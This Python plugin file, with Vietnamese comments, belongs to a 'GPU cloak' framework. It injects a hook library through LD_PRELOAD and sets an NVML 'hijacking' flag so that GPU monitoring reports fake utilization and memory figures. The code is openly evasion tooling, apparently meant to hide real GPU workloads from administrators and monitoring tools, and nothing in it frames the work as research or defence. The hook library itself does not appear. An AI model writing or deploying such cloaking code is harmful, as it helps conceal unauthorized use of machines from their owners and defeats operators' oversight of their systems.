"""NVML Interceptor Plugin - Wrapper cho libgpuhook.so"""
import os
import logging
from typing import Dict, Any, List
from ..core.interfaces import IGPUCloakService

logger = logging.getLogger(__name__)

class NVMLInterceptor(IGPUCloakService):
    """Plugin quản lý NVML API interception qua LD_PRELOAD"""
    
    def __init__(self):
        self.enabled = False
        self.fake_utilization = 0
        self.fake_memory = 0
        self.lib_path = ""
        
    @property
    def name(self) -> str:
        return "nvml_interceptor"
        
    def initialize(self, config: Dict[str, Any]) -> bool:
        """Khởi tạo NVML interceptor"""
        self.fake_utilization = config.get('fake_utilization', 0)
        self.fake_memory = config.get('fake_memory', 0)
        
        # Kiểm tra libgpuhook.so có tồn tại
        self.lib_path = config.get('lib_path', '/opt/hooks/libgpuhook.so')
        if not os.path.exists(self.lib_path):
            logger.warning(f"NVML hook library not found: {self.lib_path}")
            return False
            
        logger.info(f"NVML interceptor initialized with fake_util={self.fake_utilization}%")
        return True
        
    def start(self) -> bool:
        """Start NVML interception"""
        if not os.path.exists(self.lib_path):
            logger.error(f"NVML hook library not found: {self.lib_path}")
            return False
            
        # Thiết lập LD_PRELOAD
        current_preload = os.environ.get('LD_PRELOAD', '')
        if self.lib_path not in current_preload:
            if current_preload:
                os.environ['LD_PRELOAD'] = f"{current_preload}:{self.lib_path}"
            else:
                os.environ['LD_PRELOAD'] = self.lib_path
                
        # Thiết lập environment variables
        os.environ['ENABLE_NVML_IPC_HIJACKING'] = '1'
        
        self.enabled = True
        logger.info("✅ NVML interception started")
        return True
        
    def stop(self) -> None:
        """Stop NVML interception"""
        os.environ['ENABLE_NVML_IPC_HIJACKING'] = '0'
        self.enabled = False
        logger.info("🛑 NVML interception stopped")
        
    def enable_cloaking(self, strategies: List[str]) -> bool:
        """Kích hoạt NVML cloaking"""
        if 'nvml_interception' in strategies:
            return self.start()
        return False
        
    def disable_cloaking(self) -> bool:
        """Tắt NVML cloaking"""
        self.stop()
        return True
        
    def update_fake_metrics(self, metrics: Dict[str, int]) -> None:
        """Cập nhật fake NVML metrics"""
        if 'gpu_utilization' in metrics:
            self.fake_utilization = metrics['gpu_utilization']
            logger.info(f"Updated fake GPU utilization to {self.fake_utilization}%")
            
        if 'memory_used' in metrics:
            self.fake_memory = metrics['memory_used']
            logger.info(f"Updated fake memory usage to {self.fake_memory}MB")
            
    def get_active_strategies(self) -> List[str]:
        """Lấy danh sách strategies đang active"""
        return ['nvml_interception'] if self.enabled else []
        
    def get_status(self) -> Dict[str, Any]:
        """Lấy trạng thái NVML interceptor"""
        return {
            'name': self.name,
            'enabled': self.enabled,
            'fake_utilization': self.fake_utilization,
            'fake_memory': self.fake_memory,
            'lib_path': self.lib_path,
            'lib_exists': os.path.exists(self.lib_path)
        }